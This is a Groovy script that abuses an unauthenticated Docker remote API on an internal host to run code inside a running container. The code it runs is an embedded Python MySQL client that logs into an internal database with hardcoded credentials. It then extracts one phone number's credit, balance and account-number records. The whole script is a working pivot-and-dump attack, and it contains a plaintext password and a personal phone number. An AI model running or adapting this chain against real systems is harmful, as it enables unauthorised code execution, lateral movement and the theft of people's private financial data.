import groovy.json.JsonSlurper

def dockerHost = "172.27.140.148"
def dockerPort = 4243

// First list running containers to pick one
def url = new URL("http://${dockerHost}:${dockerPort}/containers/json")
def conn = url.openConnection()
conn.setRequestMethod("GET")
conn.setConnectTimeout(5000)
conn.setReadTimeout(5000)
def resp = conn.inputStream.text
def containers = new JsonSlurper().parseText(resp)

println "=== RUNNING CONTAINERS ==="
containers.each { c ->
    println "${c.Id[0..11]} | ${c.Image} | ${c.Names}"
}

if (containers.size() == 0) {
    println "NO CONTAINERS RUNNING"
    return
}

// Pick first container
def cid = containers[0].Id
println "\nUsing container: ${cid[0..11]} (${containers[0].Image})"

// Create exec with python script
def pyScript = '''import socket,struct,hashlib,sys
HOST="172.27.141.6"
PORT=3308
USER="apifincadodev"
PASS="1q2w3e4r5t6y"
DB="tienda"
PHONE="5558455777"
queries=[("credcliente","SELECT id_cc_credcliente,id_cliente,telefono,credito_disponible,limite_credito,saldo_credito,numero_cuenta,estatus FROM credito_clarotel_credcliente WHERE telefono LIKE '%"+PHONE+"%'"),("lineac","SELECT id_cc_linea,id_cliente,telefono,monto_total,limite_cred_tel,saldo_cred_tel,estado_linea FROM credito_clarotel_lineac WHERE telefono LIKE '%"+PHONE+"%'")]
def rp(s):
 h=b""
 while len(h)<4:h+=s.recv(4-len(h))
 l=struct.unpack("<I",h[:3]+b"\\x00")[0]
 sq=struct.unpack("B",h[3:4])[0]
 d=b""
 while len(d)<l:d+=s.recv(l-len(d))
 return sq,d
def auth(u,p,salt,db,sq):
 h1=hashlib.sha1(p.encode()).digest()
 h2=hashlib.sha1(h1).digest()
 h3=hashlib.sha1(salt+h2).digest()
 sc=bytes(bytearray(a^b for a,b in zip(bytearray(h3),bytearray(h1))))
 cap=0x0003f7cf
 pl=struct.pack("<IIB",cap,16777216,33)+b"\\x00"*23
 pl+=u.encode()+b"\\x00"+struct.pack("B",len(sc))+sc+db.encode()+b"\\x00"+b"mysql_native_password\\x00"
 return struct.pack("<I",len(pl))[:3]+struct.pack("B",sq)+pl
def do_query(s,q):
 pl=b"\\x03"+q.encode()
 s.sendall(struct.pack("<I",len(pl))[:3]+struct.pack("B",0)+pl)
 sq,d=rp(s)
 fb=struct.unpack("B",d[0:1])[0]
 if fb==0xff:print("ERR:"+d[9:].decode("latin1"));return
 if fb==0x00:print("NO_RESULTS");return
 nc=fb if fb<251 else struct.unpack("<H",d[1:3])[0]
 for _ in range(nc):sq,_=rp(s)
 sq,_=rp(s)
 count=0
 while True:
  sq,rd=rp(s)
  if struct.unpack("B",rd[0:1])[0]==0xfe and len(rd)<9:break
  if struct.unpack("B",rd[0:1])[0]==0xff:print("ERR:"+rd[9:].decode("latin1"));break
  pos=0;cols=[]
  for _ in range(nc):
   b=struct.unpack("B",rd[pos:pos+1])[0]
   if b==0xfb:cols.append("NULL");pos+=1;continue
   if b<251:ln=b;pos+=1
   elif b==252:ln=struct.unpack("<H",rd[pos+1:pos+3])[0];pos+=3
   elif b==253:ln=struct.unpack("<I",rd[pos+1:pos+4]+b"\\x00")[0];pos+=4
   else:ln=struct.unpack("<Q",rd[pos+1:pos+9])[0];pos+=9
   cols.append(rd[pos:pos+ln].decode("latin1"));pos+=ln
  print("|".join(cols));count+=1
 if count==0:print("NO_ROWS")
try:
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.settimeout(10)
 s.connect((HOST,PORT))
 sq,g=rp(s)
 salt=g[4:12]
 rp2=g.find(b"\\x00",4)+1+18
 salt+=g[rp2:g.find(b"\\x00",rp2)]
 s.sendall(auth(USER,PASS,salt,DB,sq+1))
 sq,r=rp(s)
 if struct.unpack("B",r[0:1])[0]==0xff:print("AUTH_FAIL:"+r[9:].decode("latin1"));sys.exit(1)
 print("AUTH_OK")
 for label,q in queries:
  print("=== "+label+" ===")
  do_query(s,q)
  print("")
 s.close()
except Exception as e:
 print("ERROR:"+str(e))
'''

// Create exec instance
def execUrl = new URL("http://${dockerHost}:${dockerPort}/containers/${cid}/exec")
def execConn = execUrl.openConnection()
execConn.setRequestMethod("POST")
execConn.setDoOutput(true)
execConn.setRequestProperty("Content-Type", "application/json")
execConn.setConnectTimeout(5000)
execConn.setReadTimeout(15000)

def execBody = """{"AttachStdout":true,"AttachStderr":true,"Cmd":["python","-c","${pyScript.replace('"','\\"').replace('\n','\\n')}"]}"""
execConn.outputStream.write(execBody.bytes)
def execResp = execConn.inputStream.text
def execData = new JsonSlurper().parseText(execResp)
def execId = execData.Id
println "\nExec ID: ${execId[0..11]}"

// Start exec
def startUrl = new URL("http://${dockerHost}:${dockerPort}/exec/${execId}/start")
def startConn = startUrl.openConnection()
startConn.setRequestMethod("POST")
startConn.setDoOutput(true)
startConn.setRequestProperty("Content-Type", "application/json")
startConn.setConnectTimeout(5000)
startConn.setReadTimeout(15000)
startConn.outputStream.write('{"Detach":false,"Tty":false}'.bytes)

// Read raw stream output
def is = startConn.inputStream
def baos = new ByteArrayOutputStream()
def buf = new byte[4096]
int n
while ((n = is.read(buf)) != -1) {
    baos.write(buf, 0, n)
}
def raw = baos.toByteArray()

// Docker stream multiplexing: skip 8-byte headers per frame
def output = new StringBuilder()
int pos = 0
while (pos + 8 <= raw.length) {
    int frameLen = ((raw[pos+4] & 0xFF) << 24) | ((raw[pos+5] & 0xFF) << 16) | ((raw[pos+6] & 0xFF) << 8) | (raw[pos+7] & 0xFF)
    pos += 8
    if (pos + frameLen <= raw.length) {
        output.append(new String(raw, pos, frameLen, "UTF-8"))
    }
    pos += frameLen
}
println "\n=== RESULT ==="
println output.toString()
